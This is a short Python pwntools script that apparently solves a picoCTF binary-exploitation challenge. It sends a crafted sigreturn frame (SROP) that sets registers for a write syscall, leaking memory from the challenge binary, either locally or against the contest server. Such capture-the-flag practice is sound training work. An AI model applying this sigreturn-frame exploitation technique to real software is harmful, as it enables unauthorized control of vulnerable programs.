#!/usr/bin/python3
from pwn import *

exe = context.binary = ELF("./funsignals_player_bin", checksec=False)
libc = exe.libc

warn = lambda x, msg="Test": log.warn(msg + ": " + hex(x)) or x
s = lambda data: sleep(0.1) or p.send(data)
sl = lambda data=b"": sleep(0.1) or p.sendline(data)
sa = lambda msg, data: p.sendafter(msg, data)
sla = lambda msg, data: p.sendlineafter(msg, data)

def conn():
    if args.REMOTE: 
        return remote("saturn.picoctf.net", 65497)
    else: 
        return process()
p = conn()

if args.GDB:
    context.terminal = ['tmux', 'splitw', '-h', '-p', '55']
    gdb.attach(p, gdbscript='''
        b*0x10000000
        c
	''')
#input()

frame = SigreturnFrame()
frame.rax = 1
frame.rdi = 1
frame.rsi = 0x10000023
frame.rdx = 50
frame.rsp = 0x10000050
frame.rip = 0x10000015

payload = bytes(frame)
s(payload)

with open("./attack", "wb") as file:
    file.write(bytes(frame))

p.interactive()
